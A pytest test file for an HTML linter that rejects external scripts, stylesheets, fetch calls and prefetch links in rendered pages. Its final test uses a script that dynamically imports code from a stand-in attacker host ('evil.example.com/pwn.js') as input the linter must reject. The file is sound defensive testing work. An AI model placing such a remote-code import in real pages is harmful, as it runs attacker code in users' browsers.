# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Michał Kamiński
"""US-040 linter: reject any rendered HTML that ships with external references."""
from __future__ import annotations

import pytest

from codeguide.adapters.html_external_deps_linter import (
    ExternalDependencyError,
    assert_no_external_refs,
)


def test_plain_html_passes() -> None:
    assert_no_external_refs('<html><body><p>hello</p></body></html>')


def test_external_script_rejected() -> None:
    with pytest.raises(ExternalDependencyError, match="external"):
        assert_no_external_refs(
            '<html><head><script src="https://cdn.example.com/x.js"></script></head></html>'
        )


def test_external_link_rejected() -> None:
    with pytest.raises(ExternalDependencyError):
        assert_no_external_refs(
            '<html><head><link href="https://fonts.googleapis.com" rel="stylesheet"></head></html>'
        )


def test_fetch_call_rejected() -> None:
    with pytest.raises(ExternalDependencyError, match="fetch"):
        assert_no_external_refs(
            '<html><script>fetch("/api/x").then(r=>r.json())</script></html>'
        )


def test_prefetch_link_rejected() -> None:
    with pytest.raises(ExternalDependencyError):
        assert_no_external_refs(
            '<link rel="prefetch" href="/anything">'
        )


def test_data_uri_allowed() -> None:
    """Data URIs stay inline — they must not trigger the external linter."""
    assert_no_external_refs(
        '<img src="data:image/png;base64,iVBORw0KGgo=">'
    )


def test_dynamic_import_external_rejected() -> None:
    with pytest.raises(ExternalDependencyError):
        assert_no_external_refs("<script>import('https://evil.example.com/pwn.js')</script>")
